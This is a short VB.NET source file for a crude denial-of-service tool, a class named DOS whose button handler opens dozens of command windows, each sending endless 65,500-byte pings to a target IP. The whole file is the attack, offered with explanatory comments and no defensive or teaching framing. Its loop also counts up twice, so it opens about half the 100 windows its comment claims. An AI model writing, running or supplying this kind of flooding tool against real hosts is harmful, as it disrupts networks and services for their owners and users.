Public Class DOS
    Public ip As String
    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click
        Dim count As Integer
        'create a loop to open 100 cmd
        For count = 0 To 100
            'ping the target
            '-t - keep ping 
            '-l size of the packet
            '65500 bytes is the maximun
            Dim cmd As String = ("ping " + ip + " -t -l 65500")
            'k - forever  
            Shell("cmd.exe /k" & cmd, AppWinStyle.NormalFocus)
            count = count + 1
        Next
    End Sub
End Class
